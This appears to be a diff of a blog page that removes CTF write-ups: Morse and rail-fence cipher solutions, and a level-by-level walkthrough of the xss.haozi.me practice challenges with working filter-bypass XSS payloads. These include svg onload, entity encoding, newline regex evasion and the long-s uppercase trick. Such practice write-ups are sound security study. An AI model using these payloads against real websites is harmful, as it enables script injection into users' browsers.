-<p>使用在线解密网站<a href="http://www.zou114.com/mesm/得到" target="_blank" rel="noopener">http://www.zou114.com/mesm/得到</a><br>morsecodeissointeresting，加上格式得到flag：cyberpeace{morsecodeissointeresting}</p>
-<h1 id="Railfence"><a href="#Railfence" class="headerlink" title="Railfence"></a>Railfence</h1><blockquote>
-<p>被小鱼一连将了两军，你心里更加不服气了。两个人一起继续往前走， 一路上杂耍卖艺的很多，但是你俩毫无兴趣，直直的就冲着下一个谜题的地方去了。 到了一看，这个谜面看起来就已经有点像答案了样子了，旁边还画着一张画，是一副农家小院的 图画，上面画着一个农妇在栅栏里面喂5只小鸡，你嘿嘿一笑对着小鱼说这次可是我先找到答案了。</p>
-</blockquote>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">文件ccehgyaefnpeoobe&#123;lcirg&#125;epriec_ora_g</span><br></pre></td></tr></table></figure>
-<p>栅栏密码分为传统型和WWW型两种，传统型解密网站<br><a href="http://www.zjslove.com/3.decode/zhalan/index.html" target="_blank" rel="noopener">http://www.zjslove.com/3.decode/zhalan/index.html</a><br>，这道题用传统型的方法解发现很奇怪<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">5字一栏：cyperrocae&#123;gireeol&#125;eahfocec_gnbip_g</span><br><span class="line">7字一栏：cebgccfe&#125;_en&#123;eohplprgecrayoii_aoreg</span><br></pre></td></tr></table></figure></p>
-<p>所以这道题可能是WWW型：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">WWW型栅栏密码：</span><br><span class="line">例如字符串：123456789</span><br><span class="line">	key=3</span><br><span class="line">	1----5----9  \\让数字以W型组织，同样是三组，但每组的数量不一定相同</span><br><span class="line">	-2--4-6--8</span><br><span class="line">	--3----7--</span><br><span class="line">	加密密文：159246837</span><br></pre></td></tr></table></figure>
-<p>WWW型解密网站：<a href="http://www.atoolbox.net/Tool.php?Id=777" target="_blank" rel="noopener">http://www.atoolbox.net/Tool.php?Id=777</a><br>，得到flag：cyberpeace{railfence_cipher_gogogo}</p>
-
+        <p>crypto<br>
       
-    </div>
+    </p></div>
     
     <div class="article-info article-info-index">
       
@@ -883,6 +725,10 @@
       
       <div class="clearfix"></div>
     </div>
+      
+        <p class="article-more-link">
+          <a href="/2019/09/23/攻防世界crypto新手wp/#more">more >></a>
+        </p>
       
     
   </div>
@@ -925,86 +771,7 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p><a href="https://xss.haozi.me/#/0x04" target="_blank" rel="noopener">https://xss.haozi.me/#/0x04</a> 习题答案解析：</p>
-<h3 id="0x00"><a href="#0x00" class="headerlink" title="0x00"></a>0x00</h3><h5 id="题目："><a href="#题目：" class="headerlink" title="题目："></a>题目：</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">function render (input) &#123;</span><br><span class="line">  return &apos;&lt;div&gt;&apos; + input + &apos;&lt;/div&gt;&apos;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<h5 id="payload："><a href="#payload：" class="headerlink" title="payload："></a>payload：</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(1);&lt;/script&gt;</span><br></pre></td></tr></table></figure>
-<h3 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h3><h5 id="题目：-1"><a href="#题目：-1" class="headerlink" title="题目："></a>题目：</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">function render (input) &#123;</span><br><span class="line">  return &apos;&lt;textarea&gt;&apos; + input + &apos;&lt;/textarea&gt;&apos;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>闭合<textarea>标签后输入script标签即可</textarea></p>
-<h5 id="payload：-1"><a href="#payload：-1" class="headerlink" title="payload："></a>payload：</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;/textarea&gt; &lt;script&gt;alert(1);&lt;/script&gt;</span><br></pre></td></tr></table></figure>
-<h3 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h3><h5 id="题目：-2"><a href="#题目：-2" class="headerlink" title="题目："></a>题目：</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">function render (input) &#123;</span><br><span class="line">  return &apos;&lt;input type=&quot;name&quot; value=&quot;&apos; + input + &apos;&quot;&gt;&apos;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>闭合用”和&gt;闭合input标签即可</p>
-<h5 id="payload：-2"><a href="#payload：-2" class="headerlink" title="payload："></a>payload：</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
-<h3 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h3><h5 id="题目：-3"><a href="#题目：-3" class="headerlink" title="题目："></a>题目：</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">function render (input) &#123;</span><br><span class="line">  const stripBracketsRe = /[()]/g</span><br><span class="line">  input = input.replace(stripBracketsRe, &apos;&apos;)</span><br><span class="line">  return input</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>题目中过滤了圆括号，可以用反引号来代替。此外，<strong>在js中，反引号可以代替圆括号，还可以代替单双引号。</strong></p>
-<h5 id="payload1："><a href="#payload1：" class="headerlink" title="payload1："></a>payload1：</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert`1`;&lt;/script&gt;</span><br></pre></td></tr></table></figure>
-<p>也可以可以使用throw来绕过</p>
-<h5 id="payload2："><a href="#payload2：" class="headerlink" title="payload2："></a>payload2：</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg/onload=&quot;window.onerror=eval;throw&apos;=alert\x281\x29&apos;;&quot;&gt;</span><br></pre></td></tr></table></figure>
-<blockquote>
-<p>这一写法也可以用于其他题中，<br>例如0x00：&lt;svg/onload = alert(1);&gt;<br>0x01： &lt;svg/onload = alert(1);&gt;</p>
-</blockquote>
-<h3 id="0x04"><a href="#0x04" class="headerlink" title="0x04"></a>0x04</h3><h5 id="题目：-4"><a href="#题目：-4" class="headerlink" title="题目："></a>题目：</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">function render (input) &#123;</span><br><span class="line">  const stripBracketsRe = /[()`]/g</span><br><span class="line">  input = input.replace(stripBracketsRe, &apos;&apos;)</span><br><span class="line">  return input</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>这道题将圆括号和反引号都过滤了，也就是我们不能运用模板字符串了。我们想到，我们是否可以使用unicode 编码，来代替圆括号。这种思路没错，但是我们要遇到一个问题就是unicode编码怎么才会被转码实现了，如果只是正常的html编码，unicode编码是不会有任何用的。这里我们可以在了解一下 <svg>这个标签，这是一个外部标签，可以显示文字，字符及其他数据。 而<svg> 有一个 很重要的特性，便是它可以和xml一样将unicode编码转码进行执行，也就是我们可以通过这个标签执行 unicode编码，关于这个标签的具体介绍，我们可以查看下面这篇资料：<br/><a href="https://www.hackersb.cn/hacker/85.html" target="_blank" rel="noopener">https://www.hackersb.cn/hacker/85.html</a></svg></svg></p>
-<h5 id="payload1：-1"><a href="#payload1：-1" class="headerlink" title="payload1："></a>payload1：</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg&gt;&lt;script&gt;alert&amp;#40;1&amp;#41;&lt;/script&gt;</span><br></pre></td></tr></table></figure>
-<p>也可以用上一题提到的方法</p>
-<h5 id="payload2：-1"><a href="#payload2：-1" class="headerlink" title="payload2："></a>payload2：</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg/onload=&quot;window.onerror=eval;throw&apos;=alert\x281\x29&apos;;&quot;&gt;</span><br></pre></td></tr></table></figure>
-<h3 id="0x05"><a href="#0x05" class="headerlink" title="0x05"></a>0x05</h3><h5 id="题目：-5"><a href="#题目：-5" class="headerlink" title="题目："></a>题目：</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">function render (input) &#123;</span><br><span class="line">  input = input.replace(/--&gt;/g, &apos;😂&apos;)</span><br><span class="line">  return &apos;&lt;!-- &apos; + input + &apos; --&gt;&apos;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>&lt;！–可以用 –&gt;和–!&gt;两种方式闭合</p>
-<h5 id="payload：-3"><a href="#payload：-3" class="headerlink" title="payload："></a>payload：</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">--!&gt;&lt;script&gt;alert(1);&lt;/script&gt;</span><br></pre></td></tr></table></figure>
-<h3 id="0x06"><a href="#0x06" class="headerlink" title="0x06"></a>0x06</h3><h5 id="题目：-6"><a href="#题目：-6" class="headerlink" title="题目："></a>题目：</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">function render (input) &#123;</span><br><span class="line">  input = input.replace(/auto|on.*=|&gt;/ig, &apos;_&apos;)</span><br><span class="line">  return `&lt;input value=1 $&#123;input&#125; type=&quot;text&quot;&gt;`</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>这道题过滤了auto字符串 或 on开头=为结尾的字符串或者 &gt; 。</p>
-<p>所以，这里我们想直接 注入<script> </script>是不成功的，因为，我们的 &gt;会被过滤掉。</p>
-<p>这里，我们看到在input标签注入，我么就可以使用onmousemove这个属性，这个属性是当鼠标移到input这个输入框时，就会被执行的属性。 我们可以注入： οnmοusemοve=alert(1)</p>
-<p>但是，我们这里还有一个问题，就是 onmousemove 这个注入，是以on开头且中间有=，所以我们最终的输入会被正则过滤如下：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input value=1 _alert(1) type=&quot;text&quot;&gt;</span><br></pre></td></tr></table></figure>
-<p>onmosemove=  这段字符串会被过滤，所以这里我们需要想一些办法。</p>
-<p>我们再来仔细查看上面的正则表达式: </p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">on.*=</span><br></pre></td></tr></table></figure>
-<p>这个过滤，中间有 小数点：<br><img src="https://note.youdao.com/favicon.ico" alt="1"><br>那我们就知道，它不匹配换行符，所以如果我们在  onmousemove = alert(1)之间使用换行符，那么这个正则表达式就会匹配无法成功，于是可以成功绕过</p>
-<h5 id="payload：-4"><a href="#payload：-4" class="headerlink" title="payload："></a>payload：</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">onmousemove</span><br><span class="line">=alert(1)</span><br></pre></td></tr></table></figure>
-<h3 id="0x07"><a href="#0x07" class="headerlink" title="0x07"></a>0x07</h3><h5 id="题目：-7"><a href="#题目：-7" class="headerlink" title="题目："></a>题目：</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">function render (input) &#123;</span><br><span class="line">  const stripTagsRe = /&lt;\/?[^&gt;]+&gt;/gi</span><br><span class="line"></span><br><span class="line">  input = input.replace(stripTagsRe, &apos;&apos;)</span><br><span class="line">  return `&lt;article&gt;$&#123;input&#125;&lt;/article&gt;`</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>这道题主要是对  &lt;  和  &gt;进行了过滤，也就是我们不能同时输入  &lt;  和  &gt;。</p>
-<p>所以，这里我们可以运用 浏览器的容错性，当我们少输入一个  &gt;时，浏览器仍然会解释执行我们输入的标签语言。</p>
-<p>所以我们只需要考虑输入一个单标签执行语句。</p>
-<h5 id="payload：-5"><a href="#payload：-5" class="headerlink" title="payload："></a>payload：</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg/onload =&quot;alert(1)&quot;</span><br></pre></td></tr></table></figure>
-<h3 id="0x08"><a href="#0x08" class="headerlink" title="0x08"></a>0x08</h3><h5 id="题目：-8"><a href="#题目：-8" class="headerlink" title="题目："></a>题目：</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">function render (src) &#123;</span><br><span class="line">  src = src.replace(/&lt;\/style&gt;/ig, &apos;/* \u574F\u4EBA */&apos;)</span><br><span class="line">  return `</span><br><span class="line">    &lt;style&gt;</span><br><span class="line">      $&#123;src&#125;</span><br><span class="line">    &lt;/style&gt;</span><br><span class="line">  `</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>这道题过滤了标签，可以采用空格或者换行的方法进行绕过。</p>
-<h5 id="payload：-6"><a href="#payload：-6" class="headerlink" title="payload："></a>payload：</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;/style &gt;</span><br><span class="line">&lt;script&gt;alert(1);&lt;/script&gt;</span><br></pre></td></tr></table></figure>
-<h3 id="0x09"><a href="#0x09" class="headerlink" title="0x09"></a>0x09</h3><h5 id="题目：-9"><a href="#题目：-9" class="headerlink" title="题目："></a>题目：</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">function render (input) &#123;</span><br><span class="line">  let domainRe = /^https?:\/\/www\.segmentfault\.com/</span><br><span class="line">  if (domainRe.test(input)) &#123;</span><br><span class="line">    return `&lt;script src=&quot;$&#123;input&#125;&quot;&gt;&lt;/script&gt;`</span><br><span class="line">  &#125;</span><br><span class="line">  return &apos;Invalid URL&apos;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p><strong>test(str)函数是判断 str字符串中，是否含有与a匹配的文本，有则返回 true，否则返回 false。</strong></p>
-<h5 id="payload：-7"><a href="#payload：-7" class="headerlink" title="payload："></a>payload：</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.segmentfault.com&quot;&gt;&lt;/script&gt;&lt;script&gt;alert(1);&lt;/script&gt;</span><br></pre></td></tr></table></figure>
-<h3 id="0x0A"><a href="#0x0A" class="headerlink" title="0x0A"></a>0x0A</h3><h5 id="题目：-10"><a href="#题目：-10" class="headerlink" title="题目："></a>题目：</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">function render (input) &#123;</span><br><span class="line">  function escapeHtml(s) &#123;</span><br><span class="line">    return s.replace(/&amp;/g, &apos;&amp;amp;&apos;)</span><br><span class="line">            .replace(/&apos;/g, &apos;&amp;#39;&apos;)</span><br><span class="line">            .replace(/&quot;/g, &apos;&amp;quot;&apos;)</span><br><span class="line">            .replace(/&lt;/g, &apos;&amp;lt;&apos;)</span><br><span class="line">            .replace(/&gt;/g, &apos;&amp;gt;&apos;)</span><br><span class="line">            .replace(/\//g, &apos;&amp;#x2f&apos;)</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  const domainRe = /^https?:\/\/www\.segmentfault\.com/</span><br><span class="line">  if (domainRe.test(input)) &#123;</span><br><span class="line">    return `&lt;script src=&quot;$&#123;escapeHtml(input)&#125;&quot;&gt;&lt;/script&gt;`</span><br><span class="line">  &#125;</span><br><span class="line">  return &apos;Invalid URL&apos;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<h5 id="payload：-8"><a href="#payload：-8" class="headerlink" title="payload："></a>payload：</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.segmentfault.com.haozi.me/j.js</span><br></pre></td></tr></table></figure>
-<p>不明白这个是为什么</p>
-<h3 id="0x0B"><a href="#0x0B" class="headerlink" title="0x0B"></a>0x0B</h3><h5 id="题目：-11"><a href="#题目：-11" class="headerlink" title="题目："></a>题目：</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">function render (input) &#123;</span><br><span class="line">  input = input.toUpperCase()</span><br><span class="line">  return `&lt;h1&gt;$&#123;input&#125;&lt;/h1&gt;`</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>由于HTML不区分大小写，Javascript严格区分大小写，所以将js的代码html实体编码绕过。也可以引入外部链接来解决。</p>
-<h5 id="payload：-9"><a href="#payload：-9" class="headerlink" title="payload："></a>payload：</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=# onerror=&amp;#x61;&amp;#x6C;&amp;#x65;&amp;#x72;&amp;#x74;&amp;#x28;&amp;#x31;&amp;#x29;&gt;</span><br></pre></td></tr></table></figure>
-<h3 id="0x0C"><a href="#0x0C" class="headerlink" title="0x0C"></a>0x0C</h3><h5 id="题目：-12"><a href="#题目：-12" class="headerlink" title="题目："></a>题目：</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">function render (input) &#123;</span><br><span class="line">  input = input.replace(/script/ig, &apos;&apos;)</span><br><span class="line">  input = input.toUpperCase()</span><br><span class="line">  return &apos;&lt;h1&gt;&apos; + input + &apos;&lt;/h1&gt;&apos;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>因为这道题检查并替换掉了script，所以还可以用上一题的方法<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=# onerror=&amp;#x61;&amp;#x6C;&amp;#x65;&amp;#x72;&amp;#x74;&amp;#x28;&amp;#x31;&amp;#x29;&gt;</span><br></pre></td></tr></table></figure></p>
-<p>也可以双写script绕过</p>
-<h3 id="0x0D"><a href="#0x0D" class="headerlink" title="0x0D"></a>0x0D</h3><h5 id="题目：-13"><a href="#题目：-13" class="headerlink" title="题目："></a>题目：</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">function render (input) &#123;</span><br><span class="line">  input = input.replace(/[&lt;/&quot;&apos;]/g, &apos;&apos;)</span><br><span class="line">  return `</span><br><span class="line">    &lt;script&gt;</span><br><span class="line">          // alert(&apos;$&#123;input&#125;&apos;)</span><br><span class="line">    &lt;/script&gt;</span><br><span class="line">  `</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>这里过滤掉了&lt; / “ ‘ ，而且input在注释符//后，因为//是单行注释，所以可以利用换行来逃逸，后面的’)可以用–&gt;注释。（可以不跟&lt; !– 一起使用emm）</p>
-<h5 id="payload：-10"><a href="#payload：-10" class="headerlink" title="payload："></a>payload：</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">)</span><br><span class="line">alert(1)</span><br><span class="line">--&gt;</span><br></pre></td></tr></table></figure>
-<h3 id="0x0E"><a href="#0x0E" class="headerlink" title="0x0E"></a>0x0E</h3><h5 id="题目：-14"><a href="#题目：-14" class="headerlink" title="题目："></a>题目：</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">function render (input) &#123;</span><br><span class="line">  input = input.replace(/&lt;([a-zA-Z])/g, &apos;&lt;_$1&apos;)</span><br><span class="line">  input = input.toUpperCase()</span><br><span class="line">  return &apos;&lt;h1&gt;&apos; + input + &apos;&lt;/h1&gt;&apos;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>服务器将&lt;+第一个字母转换成了&lt;_+大写字母，看似无解，但是经过长时间的搜集，发现了一个ſ字符，这个叫做“长S”。转换后正好为s</p>
-<h5 id="payload：-11"><a href="#payload：-11" class="headerlink" title="payload："></a>payload：</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;ſcript src=&quot;https://www.segmentfault.com.haozi.me/j.js&quot;&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure>
-<h3 id="0x0F"><a href="#0x0F" class="headerlink" title="0x0F"></a>0x0F</h3><h5 id="题目：-15"><a href="#题目：-15" class="headerlink" title="题目："></a>题目：</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">function render (input) &#123;</span><br><span class="line">  function escapeHtml(s) &#123;</span><br><span class="line">    return s.replace(/&amp;/g, &apos;&amp;amp;&apos;)</span><br><span class="line">            .replace(/&apos;/g, &apos;&amp;#39;&apos;)</span><br><span class="line">            .replace(/&quot;/g, &apos;&amp;quot;&apos;)</span><br><span class="line">            .replace(/&lt;/g, &apos;&amp;lt;&apos;)</span><br><span class="line">            .replace(/&gt;/g, &apos;&amp;gt;&apos;)</span><br><span class="line">            .replace(/\//g, &apos;&amp;#x2f;&apos;)</span><br><span class="line">  &#125;</span><br><span class="line">  return `&lt;img src onerror=&quot;console.error(&apos;$&#123;escapeHtml(input)&#125;&apos;)&quot;&gt;`</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>先闭合括号才能操作,再注释掉后面的括号</p>
-<p>因为这是在onerror属性里面，所以，实体编码也能解析</p>
-<h5 id="payload：-12"><a href="#payload：-12" class="headerlink" title="payload："></a>payload：</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos;);alert(&apos;1 或 &apos;);alert(1)// 或 &apos;);alert(1) (&apos;</span><br></pre></td></tr></table></figure>
-<h3 id="0x010"><a href="#0x010" class="headerlink" title="0x010"></a>0x010</h3><h5 id="题目：-16"><a href="#题目：-16" class="headerlink" title="题目："></a>题目：</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">function render (input) &#123;</span><br><span class="line">  return `</span><br><span class="line">&lt;script&gt;</span><br><span class="line">  window.data = $&#123;input&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">  `</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>无过滤,在<script>中直接执行.</p>
-<h5 id="payload：-13"><a href="#payload：-13" class="headerlink" title="payload："></a>payload：</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">alert(1)</span><br></pre></td></tr></table></figure>
-<h3 id="0x011"><a href="#0x011" class="headerlink" title="0x011"></a>0x011</h3><h5 id="题目：-17"><a href="#题目：-17" class="headerlink" title="题目："></a>题目：</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">// from alf.nu</span><br><span class="line">function render (s) &#123;</span><br><span class="line">  function escapeJs (s) &#123;</span><br><span class="line">    return String(s)</span><br><span class="line">            .replace(/\\/g, &apos;\\\\&apos;)</span><br><span class="line">            .replace(/&apos;/g, &apos;\\\&apos;&apos;)</span><br><span class="line">            .replace(/&quot;/g, &apos;\\&quot;&apos;)</span><br><span class="line">            .replace(/`/g, &apos;\\`&apos;)</span><br><span class="line">            .replace(/&lt;/g, &apos;\\74&apos;)</span><br><span class="line">            .replace(/&gt;/g, &apos;\\76&apos;)</span><br><span class="line">            .replace(/\//g, &apos;\\/&apos;)</span><br><span class="line">            .replace(/\n/g, &apos;\\n&apos;)</span><br><span class="line">            .replace(/\r/g, &apos;\\r&apos;)</span><br><span class="line">            .replace(/\t/g, &apos;\\t&apos;)</span><br><span class="line">            .replace(/\f/g, &apos;\\f&apos;)</span><br><span class="line">            .replace(/\v/g, &apos;\\v&apos;)</span><br><span class="line">            // .replace(/\b/g, &apos;\\b&apos;)</span><br><span class="line">            .replace(/\0/g, &apos;\\0&apos;)</span><br><span class="line">  &#125;</span><br><span class="line">  s = escapeJs(s)</span><br><span class="line">  return `</span><br><span class="line">&lt;script&gt;</span><br><span class="line">  var url = &apos;javascript:console.log(&quot;$&#123;s&#125;&quot;)&apos;</span><br><span class="line">  var a = document.createElement(&apos;a&apos;)</span><br><span class="line">  a.href = url</span><br><span class="line">  document.body.appendChild(a)</span><br><span class="line">  a.click()</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">`</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>思路，闭合console.log函数，再构造alert函数弹窗。<br>把”转换成\”但是\还是在””号内，无影响。然后闭合执行</p>
-<h5 id="payload：-14"><a href="#payload：-14" class="headerlink" title="payload："></a>payload：</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&quot;);alert(&quot;1</span><br></pre></td></tr></table></figure>
-<h3 id="0x012"><a href="#0x012" class="headerlink" title="0x012"></a>0x012</h3><h5 id="题目：-18"><a href="#题目：-18" class="headerlink" title="题目："></a>题目：</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">// from alf.nu</span><br><span class="line">function escape (s) &#123;</span><br><span class="line">  s = s.replace(/&quot;/g, &apos;\\&quot;&apos;)</span><br><span class="line">  return &apos;&lt;script&gt;console.log(&quot;&apos; + s + &apos;&quot;);&lt;/script&gt;&apos;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>匹配”双引号，并替换为\”；<br>由于输入点在script标签外，则不能考虑html实体编码；<br>“替换成\”，在实际输出中可以在添一个\来转义掉第一个\绕过；</p>
-<h5 id="payload：-15"><a href="#payload：-15" class="headerlink" title="payload："></a>payload：</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">\&quot;);</span><br><span class="line">alert(1);</span><br><span class="line">//</span><br></pre></td></tr></table></figure>
